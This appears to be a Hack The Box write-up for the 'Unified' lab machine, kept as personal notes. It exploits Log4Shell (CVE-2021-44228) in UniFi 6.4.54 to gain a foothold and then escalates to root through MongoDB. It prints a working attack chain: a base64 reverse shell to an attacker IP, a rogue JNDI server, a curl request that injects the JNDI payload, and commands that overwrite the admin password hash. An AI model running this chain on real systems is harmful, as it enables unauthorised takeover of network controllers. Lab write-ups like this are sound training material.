---
tags: [htb, linux, very-easy, writeup]
cve: CVE-2021-44228 (Log4Shell)
techniques: [log4shell, jndi-injection, mongodb-enum]
---

# Unified (Linux)

| Field              | Value           |
| ------------------ | --------------- |
| OS                 | Linux           |
| Difficulty         | Very Easy       |
| Box IP             | `10.129.47.118` |
| Attacker IP (tun0) | `<attacker-ip>` |

> [!info] Kill Chain
> [[nmap]] → UniFi Network Application 6.4.54 on 8443 → [[Log4Shell]] via the `remember` login field → JNDI points to my rogue-jndi LDAP server → reverse shell as `unifi` in a Docker container ([[netcat]], [[Reverse Shell]]) → MongoDB on 27117 (`ace` db) → admin `x_shadow` hash replaced → UniFi web login as administrator → SSH root password read from settings → **root**

> [!note] The flaw – what triggers the RCE
> UniFi logs the `remember` field of the login request through Log4j 2. An unauthenticated `${jndi:ldap://<attacker-ip>/x}` in that field makes the server resolve the JNDI reference over LDAP and load a remote Java class → remote code execution as the `unifi` service user. Fixed in later UniFi builds; 6.4.54 ships a vulnerable Log4j. Mechanism: [[Log4Shell]].

---

# 1 · Enumeration

## Ports → [[nmap]]

```bash
nmap -sV -sC 10.129.47.118
```

- `-sV` = service versions, `-sC` = default scripts
- 22 (SSH), 8080/8443 (UniFi, HTTP/HTTPS), 6789, 8843, 8880 open → web attack surface is the UniFi app on 8443

## Identify the application

```bash
# https://10.129.47.118:8443/ → UniFi Network login page
```

- UniFi Network Application **6.4.54** → version is known-vulnerable to [[Log4Shell]] (CVE-2021-44228)

---

# 2 · Foothold → [[Log4Shell]]

## 2.1 Rogue JNDI/LDAP server

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi && mvn package

# encode the reverse shell (see [[Reverse Shell]]) as base64
echo 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' | base64
# => <base64-revshell>

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64-revshell>}|{base64,-d}|bash" --hostname "<attacker-ip>"
```

- rogue-jndi starts an LDAP **and** an HTTP server → the LDAP response points the target to the HTTP server, from which it loads a Java class; the class runs my `--command` as it is loaded → RCE
- the reverse-shell one-liner is base64-encoded so special characters (`/`, `>`, `&`) survive being embedded in the Java class → on the target `{echo,<base64>}|{base64,-d}|bash` decodes it back and runs it
- `--hostname` = my `<attacker-ip>` → the served reference must point back to me

## 2.2 Reverse shell → [[Reverse Shell]]

```bash
nc -lvnp 4444
```

- [[netcat]] listener catches the shell once the payload fires → the base64 one-liner from 2.1 connects back here

## 2.3 Inject the JNDI string into the `remember` field

```bash
curl -k -X POST https://10.129.47.118:8443/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"a","password":"a","remember":"${jndi:ldap://<attacker-ip>:1389/o=tomcat}","strict":true}'
```

- `-k` = ignore the self-signed TLS cert
- the `remember` value is passed to Log4j → the `${jndi:ldap://...}` lookup triggers the request to rogue-jndi → server executes the command → shell as `unifi` lands in the listener
- the shell runs inside a **Docker container**, not the host → privilege escalation goes through MongoDB, not the local filesystem

---

# 3 · Privilege Escalation → [[MongoDB Enumeration]]

## 3.1 Connect to MongoDB

```shell
mongo --port 27117
```

- MongoDB listens locally on **27117** (non-default UniFi port), no authentication → direct shell access

## 3.2 Read the admin accounts

```sql
show dbs
use ace
db.admin.find()
```

- the `admin` collection holds the web-admin accounts
- the `administrator` account shows an `x_shadow` field = its password hash

## 3.3 Replace the password hash

The hash starts with `$6$` → SHA-512 crypt, so a matching hash is generated and written back.

```bash
mkpasswd -m sha-512 Password1234
# $6$7gacC6WI7fFp5niV$ib7OlJu/nepNMhZYEF5L1zuALfQAgoDiQnRVDDNoVN1XErHDZjBIkFx5fv4bszuQIuXL2W0HYdu2unWbHpmYl.
```
```shell
db.admin.update({"name":"administrator"},{$set:{"x_shadow":"$6$7gacC6WI7fFp5niV$ib7OlJu/nepNMhZYEF5L1zuALfQAgoDiQnRVDDNoVN1XErHDZjBIkFx5fv4bszuQIuXL2W0HYdu2unWbHpmYl."}})
```

- overwriting `x_shadow` sets a password → no cracking needed

## 3.4 Log in and read the root password

```bash
# https://10.129.47.118:8443/ → administrator / Password1234
```

- login as `administrator` with the replaced password → admin access to the UniFi application
- **Settings → Site** tab shows the username `root` and its password in cleartext → the host's SSH root credentials

```bash
ssh root@10.129.47.118
# => root shell, flag read
```

- the UniFi settings reuse the host root password for device management → the cleartext value grants direct SSH as root → **root flag**
